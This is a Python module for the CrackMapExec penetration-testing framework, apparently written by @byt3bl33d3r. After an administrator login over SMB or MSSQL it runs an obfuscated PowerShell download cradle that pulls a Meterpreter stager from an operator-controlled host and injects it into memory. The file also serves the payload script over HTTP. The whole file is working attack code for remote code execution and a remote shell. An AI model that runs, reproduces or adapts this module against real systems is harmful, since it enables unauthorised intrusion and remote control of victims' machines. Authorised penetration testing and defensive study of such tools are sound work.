from cme.helpers.powershell import *
from sys import exit

class CMEModule:
    '''
        Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'met_inject'
    description = "Downloads the Meterpreter stager and injects it into memory"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            SRVHOST     IP hosting of the stager server
            SRVPORT     Stager port
            RAND        Random string given by metasploit
            SSL         Stager server use https or http (default: https)
        '''

        self.met_ssl = 'https'

        if not 'SRVHOST' in module_options or not 'SRVPORT' in module_options or not 'RAND' in module_options:
            context.log.error('SRVHOST and SRVPORT  and RAND options are required!')
            exit(1)

        if 'SSL' in module_options:
            self.met_ssl = module_options['SSL']

        self.srvhost = module_options['SRVHOST']
        self.srvport = module_options['SRVPORT']
        self.rand = module_options['RAND']

        self.ps_script = obfs_ps_script('Invoke-MetasploitPayload/Invoke-MetasploitPayload.ps1')

    def on_admin_login(self, context, connection):
        payload = """Invoke-MetasploitPayload {}://{}:{}/{}""".format('http' if self.met_ssl == 'http' else 'https',
                                                            self.srvhost,
                                                            self.srvport,
                                                            self.rand)
        launcher = gen_ps_iex_cradle(context, 'Invoke-MetasploitPayload.ps1', payload, post_back=False)
        connection.ps_execute(launcher, force_ps32=True)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-MetasploitPayload.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script.encode())
            request.stop_tracking_host()
        else:
            request.send_response(404)
            request.end_headers()